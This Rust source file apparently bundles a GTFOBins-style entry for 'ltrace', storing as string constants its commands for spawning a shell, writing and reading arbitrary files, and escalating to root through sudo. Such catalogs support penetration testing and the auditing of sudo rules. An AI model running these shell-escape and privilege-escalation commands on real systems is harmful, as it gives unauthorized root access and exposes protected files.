pub static BIN_NAME: &'static str = "ltrace";
pub static SH_CODE: &'static str = r#"
    
    ltrace -b -L /bin/sh
"#;
pub static FW_DESC: &'static str = "The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    ltrace -s 999 -o $LFILE ltrace -F DATA
"#;
pub static FR_DESC: &'static str = "The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    ltrace -F $LFILE /dev/null
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo ltrace -b -L /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
